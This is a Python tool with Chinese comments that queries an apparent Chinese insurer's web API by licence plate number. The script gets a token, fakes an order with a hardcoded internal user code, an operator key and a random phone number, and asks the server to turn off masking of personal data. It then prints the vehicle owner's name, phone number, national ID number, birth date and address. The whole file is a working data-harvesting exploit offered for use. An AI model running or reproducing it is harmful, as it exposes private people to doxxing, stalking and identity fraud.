import requests
import json
import base64
import rsa
import uuid
import urllib3
import random
from Cryptodome.PublicKey import RSA
from requests import Session
import time

session = Session()
urllib3.disable_warnings()

# 修改为电脑版User-Agent
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://hub.chinalife-p.com.cn",
    "Referer": "https://hub.chinalife-p.com.cn/",
}
session.headers = headers

publicKeyStr = 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCwGbMAecQuqsZ2hQELuqSHI+R8R0NcM9SNqw245OB/vDed4Z65z97YlrjG7+bE2CPs6TLNezYey/PqdeuUfbIaG6ou+FATs5y+MZQMEMpgJBMGvjivn0cNN5yICMM/G2ZdS66Hx5U1iK6yzsDi5o3rNpXsNzN36xLhSCVaZ96y1QIDAQAB'

def get_phone_num():
    """生成随机手机号"""
    second_spot = random.choice([3, 4, 5, 7, 8])
    third_spot = {
        3: random.randint(0, 9),
        4: random.choice([5, 7, 9]),
        5: random.choice([i for i in range(10) if i != 4]),
        7: random.choice([i for i in range(10) if i not in [4, 9]]),
        8: random.randint(0, 9),
    }[second_spot]
    remain_spot = random.randint(9999999, 100000000)
    phone_num = "1{}{}{}".format(second_spot, third_spot, remain_spot)
    return phone_num

def encryptPassword(password, publicKeyStr):
    """RSA加密"""
    try:
        publicKeyBytes = base64.b64decode(publicKeyStr.encode())
        key = RSA.import_key(publicKeyBytes)
        encryptPassword = rsa.encrypt(password.encode(), key)
        return base64.b64encode(encryptPassword).decode()
    except Exception as e:
        print(f"加密失败: {e}")
        return None

def get_cookie():
    """获取初始cookie"""
    url = 'https://hub.chinalife-p.com.cn/mescifp/prod/index.html?type=customer&systemSource=E18'
    try:
        # 添加超时设置
        res = session.get(url, verify=False, timeout=10)
        res.raise_for_status()
        print("Cookie获取成功")
        return True
    except requests.exceptions.RequestException as e:
        print(f"获取Cookie失败: {e}")
        return False
    except Exception as e:
        print(f"未知错误: {e}")
        return False

def get_token():
    """获取token"""
    url = 'https://hub.chinalife-p.com.cn/MesBaseUrl/getToken'
    data = {
        "userCode": "",
        "bid": "",
    }
    
    try:
        res = session.post(url, json=data, verify=False, timeout=10)
        res.raise_for_status()
        
        res_json = res.json()
        if res_json.get('status') == '200' and 'data' in res_json and 'token' in res_json['data']:
            token = res_json['data']['token']
            headers['Oauthtoken'] = token
            session.headers.update(headers)  # 更新session的headers
            print(f"Token获取成功: {token[:20]}...")
            return True
        else:
            print(f"获取Token响应异常: {res_json}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"获取Token网络错误: {e}")
        return False
    except json.JSONDecodeError:
        print("Token响应非JSON格式")
        return False
    except Exception as e:
        print(f"获取Token未知错误: {e}")
        return False

def get_info(provinceCode, cityCode, id):
    """获取车辆信息"""
    url = 'https://mesbj.chinalife-p.com.cn/mesci/sales/SalesManager/getCusLoginInfo'
    data = {
        "cityCode": cityCode,
        "provinceCode": provinceCode,
        "extparams": "",
        "systemSource": "E18",
        "userinfo": "",
        "licensePlateNo": id
    }
    
    try:
        res = session.post(url, json=data, timeout=10)
        res.raise_for_status()
        
        res_json = res.json()
        print(f"车辆信息响应状态: {res_json.get('status')}")
        
        if res_json.get('status') == '200' and 'data' in res_json:
            data_info = res_json['data']
            return (
                data_info.get('groupCode', ''),
                data_info.get('groupType', ''),
                data_info.get('provincialCom', '')
            )
        else:
            print(f"获取车辆信息失败: {res_json.get('message', '未知错误')}")
            return None, None, None
            
    except requests.exceptions.RequestException as e:
        print(f"获取车辆信息网络错误: {e}")
        return None, None, None
    except Exception as e:
        print(f"获取车辆信息未知错误: {e}")
        return None, None, None

def get_orderNo(groupCode, groupType, provincialCom, syProductCode, licnesType, licnesTypeName, id):
    """获取订单号"""
    url = "https://mesbj.chinalife-p.com.cn/mesci/order/MesOrderInfos/searchBylicensePlateNo"
    
    # 加密车牌号和用户代码
    encrypted_id = encryptPassword(id, publicKeyStr)
    encrypted_userCode = encryptPassword('100000000000000001', publicKeyStr)
    
    if not encrypted_id or not encrypted_userCode:
        print("加密失败，无法获取订单号")
        return None
    
    data = {
        "businessOffice": groupCode,
        "businessOfficeName": groupType,
        "structureId": provincialCom,
        "saleBusinessSourceCode": "004",
        "saleBusinessSourceName": "网络销售-安心享平台",
        "saleChnnelCode": "04",
        "saleChnnelName": "数字",
        "syProductCode": syProductCode,
        "userCode": encrypted_userCode,
        "licnesNo": encrypted_id,
        "licnesType": licnesType,
        "licnesTypeName": licnesTypeName,
        "positionCode": "",
        "positionName": "",
        "loginUserCode": "100000000000000001",
        "ifFalse": "2",
        "customerPhone": get_phone_num(),
        "newCarFlag": "",
        "reformFlag": "1",
        "shareImgFlag": "0",
        "shareImgUserCode": "",
        "practfno": "",
        "ubiType": "0",
        "systemSource": "E18",
        "initialSystemSource": "E18",
        "oldPolicyFlag": "2",
        "userName": "自助投保",
        "officeid": "",
        "extparams": "",
        "userid": "",
        "userinfo": "",
        "salesGethdbyhpFlag": "1",
        "oriSysOperator": "E18_user",
        "oriSysOperatorKey": "Rcdaz11",
        "trackId": str(uuid.uuid4()),
        "agentRate": "0"
    }

    try:
        res = session.post(url, json=data, verify=False, timeout=10)
        res.raise_for_status()
        
        res_json = res.json()
        print(f"订单号响应状态: {res_json.get('status')}")
        
        if res_json.get('status') == '200' and 'data' in res_json and 'orderNo' in res_json['data']:
            orderNo = res_json['data']['orderNo']
            print(f"获取订单号成功: {orderNo}")
            return orderNo
        else:
            print(f"获取订单号失败: {res_json.get('message', '未知错误')}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"获取订单号网络错误: {e}")
        return None
    except Exception as e:
        print(f"获取订单号未知错误: {e}")
        return None

def get_licensePlateNo(orderNo):
    """获取车牌号（脱敏后）"""
    url = 'https://mesbj.chinalife-p.com.cn/mesci/order/MesOrderInfos/getInsuranceInformation'
    
    encrypted_userCode = encryptPassword('100000000000000001', publicKeyStr)
    if not encrypted_userCode:
        print("加密失败")
        return None
    
    data = {
        "userCode": encrypted_userCode,
        "thisId": orderNo,
        "systemSource": "E18"
    }

    try:
        res = session.post(url, json=data, verify=False, timeout=10)
        res.raise_for_status()
        
        res_json = res.json()
        
        if res_json.get('status') == '200' and 'data' in res_json and 'desensitizationJson' in res_json['data']:
            desensitizationJson = json.loads(res_json['data']['desensitizationJson'])
            licensePlateNo = desensitizationJson.get('licensePlateNo', '')
            print(f"获取脱敏车牌号: {licensePlateNo}")
            return licensePlateNo
        else:
            print(f"获取车牌号失败: {res_json.get('message', '未知错误')}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"获取车牌号网络错误: {e}")
        return None
    except Exception as e:
        print(f"获取车牌号未知错误: {e}")
        return None

def 查询(id):
    """主查询函数"""
    try:
        print(f"开始查询车牌号: {id}")
        print("-" * 50)
        
        # 1. 获取cookie
        if not get_cookie():
            print("获取Cookie失败，程序终止")
            return False
        
        # 2. 获取token
        if not get_token():
            print("获取Token失败，程序终止")
            return False
        
        # 3. 获取车辆基本信息
        syProductCode = '0521'
        licnesType = '02'
        licnesTypeName = '小型汽车号牌'
        
        groupCode, groupType, provincialCom = get_info('110000', '110105', id)
        if not all([groupCode, groupType, provincialCom]):
            print("获取车辆信息失败，程序终止")
            return False
        
        print(f"groupCode: {groupCode}, groupType: {groupType}, provincialCom: {provincialCom}")
        
        # 4. 获取订单号
        orderNo = get_orderNo(groupCode, groupType, provincialCom, syProductCode, licnesType, licnesTypeName, id)
        if not orderNo:
            print("获取订单号失败，程序终止")
            return False
        
        # 5. 获取脱敏车牌号
        licensePlateNo = get_licensePlateNo(orderNo)
        if not licensePlateNo:
            print("获取脱敏车牌号失败，程序终止")
            return False
        
        # 6. 查询详细信息
        url = "https://mesbj.chinalife-p.com.cn/mesci/order/MesCarInfo/findByLicensePlateNo"
        
        # 创建脱敏车牌号
        if len(id) >= 4:
            id_list = list(id)
            id_list[2] = '*'
            id_list[3] = '*'
            masked_plate = ''.join(id_list)
        else:
            masked_plate = id
            
        encrypted_masked_plate = encryptPassword(masked_plate, publicKeyStr)
        if not encrypted_masked_plate:
            print("加密脱敏车牌号失败")
            return False
        
        data = {
            "licensePlateNo": encrypted_masked_plate,
            "licenseType": licnesType,
            "orderNo": orderNo,
            "licenseInfoThreeFlag": "0",
            "licenseInfoYwyThreeFlag": "0",
            "versionIdentify": "1",
            "desensitizationJson": json.dumps({
                "address": None,
                "addressChange": None,
                "applicantName": None,
                "applicantNameChange": None,
                "carOwnerCardNo": None,
                "carOwnerCardNoChange": None,
                "carOwnerName": None,
                "carOwnerNameChange": None,
                "carPostalAddress": None,
                "carPostalAddressChange": None,
                "customerName": None,
                "customerNameChange": None,
                "engineNo": None,
                "engineNoChange": None,
                "frameNo": None,
                "frameNoChange": None,
                "homeAddress": None,
                "homeAddressChange": None,
                "identifyNumber": None,
                "identifyNumberChange": None,
                "licensePlateNo": licensePlateNo,
                "licensePlateNoChange": "0",
                "mobile": None,
                "mobileChange": None,
                "phone": None,
                "phoneChange": None,
                "pubAddress": None,
                "pubAddressChange": None,
                "pubApplicantName": None,
                "pubApplicantNameChange": None,
                "pubIdentifyNumber": None,
                "pubIdentifyNumberChange": None,
                "pubPhone": None,
                "pubPhoneChange": None,
                "taxPayerAddress": None,
                "taxPayerAddressChange": None,
                "taxPayerIdentifyNumber": None,
                "taxPayerName": None,
                "taxPayerNameChange": None,
                "taxPayerType": "1"
            })
        }

        res = session.post(url, json=data, verify=False, timeout=10)
        res.raise_for_status()
        
        res_json = res.json()
        print(f"详细查询响应状态: {res_json.get('status')}")
        
        if res_json.get('status') == '200':
            data_info = res_json.get('data', {})
            carCustomer = data_info.get('carCustomer', 'N/A')
            
            print("\n" + "=" * 50)
            print("查询结果:")
            print("=" * 50)
            print(f"姓名: {data_info.get('customerName', 'N/A')}")
            print(f"手机号: {data_info.get('phone', 'N/A')}")
            print(f"身份证: {data_info.get('identifyNumber', 'N/A')}")
            print(f"出生日期: {data_info.get('birthDate', 'N/A')}")
            print(f"地址: {data_info.get('address', 'N/A')}")
            print(f"车辆所有人: {carCustomer}")
            print("=" * 50)
            
            return carCustomer
        else:
            print(f"详细查询失败: {res_json.get('message', '未知错误')}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"网络请求错误: {e}")
        return False
    except Exception as e:
        print(f"查询过程中发生未知错误: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """主函数"""
    print("中国人寿车辆信息查询系统")
    print("=" * 50)
    
    while True:
        id = input('请输入车牌号(输入q退出): ').strip()
        
        if id.lower() == 'q':
            print("感谢使用，再见！")
            break
            
        if not id:
            print("车牌号不能为空，请重新输入")
            continue
            
        print(f"\n正在查询车牌号: {id}")
        print("-" * 50)
        
        result = 查询(id)
        
        if result:
            print("查询成功！")
        else:
            print("查询失败！")
        
        print("\n" + "=" * 50 + "\n")
        
        # 等待一下，避免请求过快
        time.sleep(1)

if __name__ == '__main__':
    main()
